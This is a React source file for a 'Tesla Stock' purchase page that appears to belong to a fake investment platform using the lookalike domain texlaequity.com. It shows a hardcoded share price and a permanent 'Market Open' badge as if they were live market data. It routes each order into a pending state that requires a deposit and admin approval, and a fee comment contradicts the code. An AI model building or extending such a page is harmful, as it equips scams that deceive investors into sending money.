import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter,
} from "@/components/ui/dialog";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { useCurrency } from "@/hooks/useCurrency";
import { toast } from "sonner";
import { TrendingUp, Loader2 } from "lucide-react";

const FEE_RATE = 0.00; // 1% platform fee
const ADMIN_EMAIL = "admin@texlaequity.com";

// Static values — update these manually whenever you want to change the displayed price.
const STOCK_PRICE = 248.50;
const PREVIOUS_CLOSE = 245.20;
const PRICE_CHANGE = STOCK_PRICE - PREVIOUS_CLOSE;
const PRICE_CHANGE_PERCENT = (PRICE_CHANGE / PREVIOUS_CLOSE) * 100;
const MARKET_OPEN = true;

type StockOrder = {
  id: string;
  shares: number;
  price_per_share: number;
  fees: number;
  total_cost: number;
  status: string;
  created_at: string;
};

export default function TeslaStock() {
  const { user } = useAuth();
  const { format } = useCurrency();
  const navigate = useNavigate();

  const [orders, setOrders] = useState<StockOrder[]>([]);
  const [buyOpen, setBuyOpen] = useState(false);
  const [shares, setShares] = useState("");
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    if (!user) return;
    supabase
      .from("stock_orders")
      .select("*")
      .eq("user_id", user.id)
      .order("created_at", { ascending: false })
      .then(({ data }) => setOrders((data as StockOrder[] | null) ?? []));
  }, [user]);

  const price = STOCK_PRICE;
  const shareCount = Number(shares) || 0;
  const subtotal = shareCount * price;
  const fees = subtotal * FEE_RATE;
  const total = subtotal + fees;

  const openBuy = () => {
    setShares("");
    setBuyOpen(true);
  };

  const confirmPurchase = async () => {
    if (!user || !shareCount) {
      toast.warning("Enter the number of shares you want to buy");
      return;
    }
    setSubmitting(true);

    const { error } = await supabase.from("stock_orders").insert({
      user_id: user.id,
      symbol: "TSLA",
      shares: shareCount,
      price_per_share: price,
      fees,
      total_cost: total,
      status: "pending",
    });

    if (error) {
      setSubmitting(false);
      toast.error(error.message);
      return;
    }

    const userEmail = user.email ?? "";
    void supabase.functions.invoke("send-email", {
      body: {
        email: userEmail,
        subject: "Tesla Share Purchase — Deposit Required",
        message: `<p>You have requested to buy Tesla shares. Continue with deposit.</p><p><strong>${shareCount} TSLA shares</strong> at ${format(price)}/share — total due: <strong>${format(total)}</strong> (incl. fees).</p>`,
      },
    }).catch(() => {});
    void supabase.functions.invoke("send-email", {
      body: {
        email: ADMIN_EMAIL,
        subject: `Stock order from ${userEmail || "user"}`,
        message: `<p>${userEmail || "A user"} requested ${shareCount} TSLA shares at ${format(price)}/share — total ${format(total)}. Awaiting deposit + approval.</p>`,
      },
    }).catch(() => {});

    setSubmitting(false);
    setBuyOpen(false);
    toast("You have requested to buy Tesla shares. Continue with deposit.", {
      style: { background: "#2563eb", color: "#ffffff", border: "none" },
    });

    navigate(`/dashboard/deposit?amount=${total.toFixed(2)}`);
  };

  return (
    <div className="space-y-6">
      <div>
        <p className="label-mono text-muted-foreground mb-2">Invest in Tesla</p>
        <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Tesla Stock</h1>
        <p className="text-muted-foreground text-[14px] mt-1">
          Buy shares of Tesla Inc. directly from your dashboard.
        </p>
      </div>

      <Card className="rounded-2xl border-border p-6 max-w-2xl">
        <div className="flex flex-wrap items-start justify-between gap-4 mb-5">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-primary-glow flex items-center justify-center text-primary-foreground font-display text-lg font-bold shrink-0">
              T
            </div>
            <div>
              <p className="font-display text-lg font-medium text-foreground">Tesla Inc.</p>
              <p className="text-[12px] text-muted-foreground">TSLA · NASDAQ</p>
            </div>
          </div>

          <div className="text-right">
            <p className="font-display text-2xl font-medium">{format(price)}</p>
            <div className={`flex items-center justify-end gap-1 text-[12px] font-medium ${PRICE_CHANGE >= 0 ? "text-emerald-600" : "text-destructive"}`}>
              <TrendingUp className="w-3.5 h-3.5" />
              {PRICE_CHANGE >= 0 ? "+" : ""}{PRICE_CHANGE.toFixed(2)} ({PRICE_CHANGE_PERCENT.toFixed(2)}%)
            </div>
            <span className={`inline-block mt-1 text-[10px] px-2 py-0.5 rounded-full ${MARKET_OPEN ? "bg-emerald-500/10 text-emerald-700" : "bg-muted text-muted-foreground"}`}>
              {MARKET_OPEN ? "Market Open" : "Market Closed"}
            </span>
          </div>
        </div>

        <p className="text-[13px] text-muted-foreground leading-relaxed mb-4">
          Tesla, Inc. designs, manufactures, and sells electric vehicles, energy storage, and solar
          products. Headquartered in Austin, Texas, Tesla is a leader in sustainable transportation
          and clean energy.
        </p>

        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-[12px] mb-5">
          <div>
            <p className="text-muted-foreground">CEO</p>
            <p className="font-medium text-foreground">Elon Musk</p>
          </div>
          <div>
            <p className="text-muted-foreground">Exchange</p>
            <p className="font-medium text-foreground">NASDAQ</p>
          </div>
          <div>
            <p className="text-muted-foreground">Ticker</p>
            <p className="font-medium text-foreground">TSLA</p>
          </div>
          <div>
            <p className="text-muted-foreground">Prev. Close</p>
            <p className="font-medium text-foreground">{format(PREVIOUS_CLOSE)}</p>
          </div>
        </div>

        <Button className="w-full" onClick={openBuy}>
          <TrendingUp className="w-4 h-4" />
          Buy Tesla Shares
        </Button>
      </Card>

      <Card className="rounded-2xl border-border overflow-hidden max-w-2xl">
        <div className="p-6 pb-0">
          <h2 className="font-display text-lg font-medium mb-4">Transaction History</h2>
        </div>
        {orders.length === 0 ? (
          <p className="text-[13px] text-muted-foreground px-6 pb-6">No transactions yet.</p>
        ) : (
          <div className="divide-y divide-border">
            {orders.map((o) => (
              <div key={o.id} className="flex items-center justify-between p-4 text-[12px]">
                <div>
                  <p className="font-medium text-foreground">Tesla Inc. (TSLA)</p>
                  <p className="text-muted-foreground">{new Date(o.created_at).toLocaleDateString()}</p>
                </div>
                <div className="text-right">
                  <p className="font-medium">{o.shares} shares @ {format(o.price_per_share)}</p>
                  <p className="text-muted-foreground">{format(o.total_cost)} total</p>
                </div>
                <span className={`text-[10px] px-2 py-1 rounded-full font-medium ${
                  o.status === "approved" ? "bg-emerald-500/10 text-emerald-700"
                  : o.status === "rejected" ? "bg-destructive/10 text-destructive"
                  : "bg-muted text-muted-foreground"
                }`}>
                  {o.status}
                </span>
              </div>
            ))}
          </div>
        )}
      </Card>

      <Dialog open={buyOpen} onOpenChange={(o) => !submitting && setBuyOpen(o)}>
        <DialogContent className="bg-white text-slate-900 rounded-2xl border-0 max-w-md">
          <DialogHeader>
            <DialogTitle className="text-slate-900">Buy Tesla Shares</DialogTitle>
            <DialogDescription className="text-slate-500">
              Enter the number of shares you'd like to buy.
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-3 py-2 text-[13px]">
            <div className="flex justify-between"><span className="text-slate-500">Company</span><span className="font-medium">Tesla Inc.</span></div>
            <div className="flex justify-between"><span className="text-slate-500">Ticker</span><span className="font-medium">TSLA</span></div>

            <div className="space-y-1.5 pt-2">
              <Label className="text-slate-700 text-sm">Amount to buy (shares)</Label>
              <Input
                type="number"
                min="0"
                step="any"
                value={shares}
                onChange={(e) => setShares(e.target.value)}
                placeholder="e.g. 5"
              />
            </div>

            <div className="flex justify-between pt-2"><span className="text-slate-500">Price per share</span><span className="font-medium">{format(price)}</span></div>
            <div className="flex justify-between"><span className="text-slate-500">Estimated fees</span><span className="font-medium">{format(fees)}</span></div>
            <div className="flex justify-between pt-2 border-t border-slate-200 text-[14px]">
              <span className="font-medium">Total cost</span>
              <span className="font-semibold">{format(total)}</span>
            </div>
          </div>

          <DialogFooter className="flex-row gap-2 sm:gap-2">
            <Button variant="outline" onClick={() => setBuyOpen(false)} disabled={submitting}
              className="flex-1 border-slate-300 text-slate-700 hover:bg-slate-100">
              Cancel
            </Button>
            <Button onClick={confirmPurchase} disabled={submitting || !shareCount} className="flex-1">
              {submitting && <Loader2 className="w-4 h-4 animate-spin mr-2" />}
              Confirm Purchase
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
